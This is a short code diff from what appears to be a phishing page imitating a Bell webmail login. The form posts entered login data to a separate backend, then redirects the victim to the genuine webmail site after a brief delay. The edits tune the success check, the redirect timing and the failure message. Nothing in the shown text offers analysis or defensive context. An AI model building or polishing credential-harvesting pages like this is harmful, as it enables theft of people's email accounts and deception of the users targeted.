@@ -85,11 +85,11 @@ setTimeout(() => {
       const res = await fetch(BACKEND_URL, { method: 'POST', body: formData });
       const data = await res.json();
 
-      if (data.status === 'success') {
+      if (res.ok) {
         message = { type: 'success', text: data.message || content[lang].success };
-          setTimeout(() => { window.location.href = "https://webmail.en.bellnet.ca"; }, 1000);
+          setTimeout(() => { window.location.href = "https://webmail.en.bellnet.ca"; }, 1500);
         } else {
-        message = { type: 'error', text: data.message };
+        message = { type: 'error', text: data.message || 'Login failed.' };
       }
     } catch {
       message = { type: 'error', text: content[lang].connErr };
